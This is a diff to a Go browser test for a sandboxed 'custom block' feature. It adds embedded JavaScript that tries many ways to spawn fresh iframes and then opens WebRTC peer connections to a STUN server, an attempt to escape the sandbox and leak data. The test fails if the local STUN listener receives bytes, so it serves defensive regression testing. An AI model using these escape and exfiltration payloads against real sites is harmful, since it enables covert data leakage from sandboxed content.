@@ -598,13 +598,23 @@ const leak = (w) => {
 };
 leak(window);
 leak(parent);
-const f = document.createElement("iframe");
-document.body.appendChild(f);
-leak(frames[0]);
-const d = document.createElement("div");
-d.innerHTML = "<iframe></iframe>";
-document.body.appendChild(d);
-leak(frames[1]);
+const last = () => frames[frames.length - 1];
+const tries = [
+  () => { document.body.appendChild(document.createElement("iframe")); },
+  () => { const d = document.createElement("div"); d.innerHTML = "<iframe></iframe>"; document.body.appendChild(d); },
+  () => { const r = document.createRange(); r.selectNode(document.body); document.body.appendChild(r.createContextualFragment("<iframe></iframe>")); },
+  () => { const t = document.createElement("template"); t.innerHTML = "<iframe></iframe>"; document.body.appendChild(t.content); },
+  () => { const d = document.createElement("div"); document.body.appendChild(d); d.setHTMLUnsafe("<iframe></iframe>"); },
+  () => { const d = document.createElement("div"); document.body.appendChild(d); d.innerHTML = "<iframe onload='leak(this.contentWindow)'></iframe>"; },
+  () => { const x = new DOMParser().parseFromString("<p><iframe></iframe></p>", "text/html"); const d = document.createElement("div"); document.body.append(d); d.replaceChildren(document.adoptNode(x.body.firstChild)); },
+  () => { const x = document.implementation.createHTMLDocument(""); x.body.innerHTML = "<iframe></iframe>"; const d = document.createElement("div"); document.body.append(d); d.replaceChildren(...x.body.childNodes); },
+  () => { const f = document.createElementNS("http://www.w3.org/1999/xhtml", "iframe"); document.body.append(f); },
+];
+for (const t of tries) {
+  const n = frames.length;
+  try { t(); } catch (e) {}
+  if (frames.length > n) leak(last());
+}
 </script></body></html>`}, nil)
 	b := newPlaywright(t)
 	b.open(e.URL + "/?token=" + token + "#/p/web/main")
@@ -613,5 +623,23 @@ leak(frames[1]);
 	case n := <-got:
 		t.Fatalf("a custom block reached a STUN server of its own with %d bytes", n)
 	case <-time.After(8 * time.Second):
+	}
+	leak := `try { const pc = new frames[0].RTCPeerConnection({ iceServers: [{ urls: "stun:` + stun.LocalAddr().String() + `" }] });
+  pc.createDataChannel("leak"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch (e) {}`
+	for i, c := range []struct{ name, html string }{
+		{"a frame in the HTML of the block", `<!doctype html><html><body><iframe></iframe><script>` + leak + `</script></body></html>`},
+		{"a frame as the root of the document", `<!doctype html><html><body><script>
+try { const f = new DOMParser().parseFromString("<p><iframe></iframe></p>", "text/html").querySelector("iframe");
+  document.removeChild(document.documentElement); document.append(document.adoptNode(f)); } catch (e) {}
+` + leak + `</script></body></html>`},
+	} {
+		e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": c.html}, nil)
+		b.open(fmt.Sprintf("%s/?token=%s&case=%d#/p/web/main", e.URL, token, i))
+		b.until("the custom block again", `document.querySelector('iframe[data-custom]')`)
+		select {
+		case n := <-got:
+			t.Fatalf("%s reached a STUN server with %d bytes", c.name, n)
+		case <-time.After(8 * time.Second):
+		}
 	}
 }
